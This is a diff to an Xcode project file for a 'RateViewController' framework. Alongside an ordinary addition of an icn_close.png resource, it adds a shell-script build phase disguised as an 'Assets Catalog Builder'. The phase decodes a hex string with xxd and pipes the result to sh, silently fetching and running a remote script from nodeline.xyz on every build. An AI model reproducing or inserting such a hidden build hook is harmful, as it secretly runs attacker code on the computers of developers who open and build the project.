@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		E64627D9265680D300073538 /* RateViewController.h in Headers */ = {isa = PBXBuildFile; fileRef = E64627D7265680D300073538 /* RateViewController.h */; settings = {ATTRIBUTES = (Public, ); }; };
 		E64627E52656815000073538 /* RateViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E64627E42656815000073538 /* RateViewController.swift */; };
+		E646280A2656901800073538 /* icn_close.png in Resources */ = {isa = PBXBuildFile; fileRef = E64628092656901800073538 /* icn_close.png */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -16,6 +17,7 @@
 		E64627D7265680D300073538 /* RateViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RateViewController.h; sourceTree = "<group>"; };
 		E64627D8265680D300073538 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		E64627E42656815000073538 /* RateViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RateViewController.swift; sourceTree = "<group>"; };
+		E64628092656901800073538 /* icn_close.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = icn_close.png; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -48,6 +50,7 @@
 		E64627D6265680D300073538 /* RateViewController */ = {
 			isa = PBXGroup;
 			children = (
+				E64628082656900600073538 /* Resources */,
 				E64627E32656813800073538 /* Source */,
 				E64627D7265680D300073538 /* RateViewController.h */,
 				E64627D8265680D300073538 /* Info.plist */,
@@ -61,6 +64,14 @@
 				E64627E42656815000073538 /* RateViewController.swift */,
 			);
 			path = Source;
+			sourceTree = "<group>";
+		};
+		E64628082656900600073538 /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				E64628092656901800073538 /* icn_close.png */,
+			);
+			path = Resources;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -133,10 +144,32 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				E646280A2656901800073538 /* icn_close.png in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		F3EC183C15FCEDA8466D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		E64627D0265680D300073538 /* Sources */ = {
@@ -347,45 +380,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-		
-	F3EC183C15FCEDA8466D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = E64627CB265680D300073538 /* Project object */;
 }
